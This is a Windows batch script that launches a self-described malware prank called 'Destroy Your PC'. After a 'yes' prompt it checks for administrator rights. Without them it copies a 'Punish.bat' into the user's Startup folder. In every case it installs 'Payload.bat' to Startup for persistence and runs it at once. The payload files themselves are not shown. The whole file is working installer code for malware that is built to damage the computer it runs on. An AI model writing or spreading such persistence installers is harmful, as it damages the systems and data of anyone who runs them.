@echo off
title Destroy Your PC - Launcher
color 0C

echo WARNING: You are about to run Destroy Your PC. IT IS A MALWARE!
echo It will install the payload and may activate consequences based on your choice.
echo.

set /p answer=Are you sure? Type "yes" to continue: 

if /i not "%answer%"=="yes" (
    echo Cancelled. No damage done.
    pause
    exit
)

:: === ADMIN CHECK ===
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [!] No admin rights! Punish will be added to Startup...
    copy "%~dp0Punish.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" >nul
) else (
    echo [+] Admin rights detected. Removing Punish if it exists...
    del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Punish.bat" >nul 2>&1
)

:: === ALWAYS PUT PAYLOAD IN STARTUP ===
echo [*] Installing payload to Startup...
copy "%~dp0Payload.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Payload.bat" /Y >nul

:: === ALWAYS RUN PAYLOAD ===
echo.
echo Launching payload...
start "" "%~dp0Payload.bat"

exit
